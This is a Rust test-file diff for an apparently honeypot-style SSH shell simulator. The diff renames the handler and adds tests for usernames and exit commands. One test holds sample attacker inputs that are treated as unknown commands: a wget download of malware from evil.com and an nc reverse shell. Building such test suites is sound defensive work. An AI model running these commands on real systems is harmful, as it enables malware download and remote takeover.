@@ -1,8 +1,8 @@
 // Tests for SSH protocol handler
 #[cfg(test)]
 mod tests {
-    use crate::protocols::ssh::SshHandler;
-    use crate::protocols::{LlmEscalationConfig, ProtocolHandler};
+    use crate::protocols::ssh_shell::SshShellSimulator;
+    use crate::protocols::LlmEscalationConfig;
     use crate::handler::ChatService;
 
     // Mock ChatService for testing
@@ -24,13 +24,11 @@ mod tests {
             response: "mock response".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let handler = SshHandler::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config);
 
-        assert_eq!(handler.protocol_name(), "SSH");
-        assert_eq!(handler.username, "root");
-        assert_eq!(handler.hostname, "ubuntu-server");
-        assert_eq!(handler.current_dir, "/root");
-        assert!(!handler.authenticated);
+        assert_eq!(simulator.username, "root");
+        assert_eq!(simulator.hostname, "ubuntu-server");
+        assert_eq!(simulator.current_dir, "/root");
     }
 
     #[test]
@@ -39,12 +37,12 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let handler = SshHandler::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config);
 
-        assert!(handler.is_known_command("ls"));
-        assert!(handler.is_known_command("pwd"));
-        assert!(handler.is_known_command("whoami"));
-        assert!(handler.is_known_command("uname -a"));
+        assert!(simulator.is_known_command("ls"));
+        assert!(simulator.is_known_command("pwd"));
+        assert!(simulator.is_known_command("whoami"));
+        assert!(simulator.is_known_command("uname -a"));
     }
 
     #[test]
@@ -53,11 +51,11 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let handler = SshHandler::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config);
 
-        assert!(handler.is_known_command("cd /tmp"));
-        assert!(handler.is_known_command("cd .."));
-        assert!(handler.is_known_command("cd"));
+        assert!(simulator.is_known_command("cd /tmp"));
+        assert!(simulator.is_known_command("cd .."));
+        assert!(simulator.is_known_command("cd"));
     }
 
     #[test]
@@ -66,10 +64,10 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let handler = SshHandler::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config);
 
-        assert!(handler.is_known_command("cat /etc/passwd"));
-        assert!(handler.is_known_command("cat somefile.txt"));
+        assert!(simulator.is_known_command("cat /etc/passwd"));
+        assert!(simulator.is_known_command("cat somefile.txt"));
     }
 
     #[test]
@@ -78,10 +76,10 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let handler = SshHandler::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config);
 
-        assert!(!handler.is_known_command("wget http://evil.com/malware"));
-        assert!(!handler.is_known_command("nc -e /bin/sh 1.2.3.4 443"));
+        assert!(!simulator.is_known_command("wget http://evil.com/malware"));
+        assert!(!simulator.is_known_command("nc -e /bin/sh 1.2.3.4 443"));
     }
 
     #[test]
@@ -90,9 +88,9 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut handler = SshHandler::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config);
 
-        let response = handler.get_native_response("ls");
+        let response = simulator.get_native_response("ls");
         assert!(response.is_some());
         assert!(response.unwrap().contains(".bashrc"));
     }
@@ -103,9 +101,9 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut handler = SshHandler::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config);
 
-        let response = handler.get_native_response("pwd");
+        let response = simulator.get_native_response("pwd");
         assert!(response.is_some());
         assert!(response.unwrap().contains("/root"));
     }
@@ -116,9 +114,9 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut handler = SshHandler::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config);
 
-        let response = handler.get_native_response("whoami");
+        let response = simulator.get_native_response("whoami");
         assert!(response.is_some());
         assert!(response.unwrap().contains("root"));
     }
@@ -129,17 +127,17 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut handler = SshHandler::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config);
 
-        assert_eq!(handler.current_dir, "/root");
+        assert_eq!(simulator.current_dir, "/root");
 
-        let response = handler.get_native_response("cd /tmp");
+        let response = simulator.get_native_response("cd /tmp");
         assert!(response.is_some());
-        assert_eq!(handler.current_dir, "/tmp");
+        assert_eq!(simulator.current_dir, "/tmp");
 
-        let response = handler.get_native_response("cd ..");
+        let response = simulator.get_native_response("cd ..");
         assert!(response.is_some());
-        assert_eq!(handler.current_dir, "/");
+        assert_eq!(simulator.current_dir, "/");
     }
 
     #[test]
@@ -148,9 +146,9 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut handler = SshHandler::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config);
 
-        let response = handler.get_native_response("unknown_command");
+        let response = simulator.get_native_response("unknown_command");
         assert!(response.is_none());
     }
 
@@ -160,9 +158,38 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let handler = SshHandler::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config);
 
-        let prompt = handler.get_prompt();
+        let prompt = simulator.get_prompt();
         assert_eq!(prompt, "root@ubuntu-server:/root# ");
+    }
+
+    #[test]
+    fn test_ssh_set_username() {
+        let mock_chat = MockChatService {
+            response: "".to_string(),
+        };
+        let config = LlmEscalationConfig::default();
+        let mut simulator = SshShellSimulator::new(mock_chat, config);
+
+        simulator.set_username("attacker".to_string());
+        assert_eq!(simulator.username, "attacker");
+        assert_eq!(simulator.get_prompt(), "attacker@ubuntu-server:/root# ");
+    }
+
+    #[test]
+    fn test_ssh_is_exit_command() {
+        let mock_chat = MockChatService {
+            response: "".to_string(),
+        };
+        let config = LlmEscalationConfig::default();
+        let simulator = SshShellSimulator::new(mock_chat, config);
+
+        assert!(simulator.is_exit_command("exit"));
+        assert!(simulator.is_exit_command("quit"));
+        assert!(simulator.is_exit_command("EXIT"));
+        assert!(simulator.is_exit_command("QUIT"));
+        assert!(!simulator.is_exit_command("ls"));
+        assert!(!simulator.is_exit_command("pwd"));
     }
 }
